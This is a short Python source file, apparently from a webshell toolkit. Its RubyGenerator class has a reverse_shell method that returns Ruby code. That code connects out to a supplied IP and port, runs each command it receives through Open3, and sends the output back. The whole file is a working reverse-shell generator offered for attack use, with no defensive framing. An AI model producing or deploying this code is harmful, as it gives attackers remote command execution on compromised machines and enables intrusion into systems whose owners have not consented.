"""Ruby code generator for webshell operations."""


class RubyGenerator:
    """Generate Ruby code for webshell operations."""

    @staticmethod
    def reverse_shell(target_ip: str, target_port: int) -> str:
        """Generate Ruby reverse shell code."""
        return f"""require 'socket';
require 'open3';
s=TCPSocket.new("{target_ip}",{target_port});
while cmd=s.gets;
    Open3.popen3(cmd.chomp){{|stdin,stdout,stderr|s.puts stdout.read+stderr.read}}
end"""
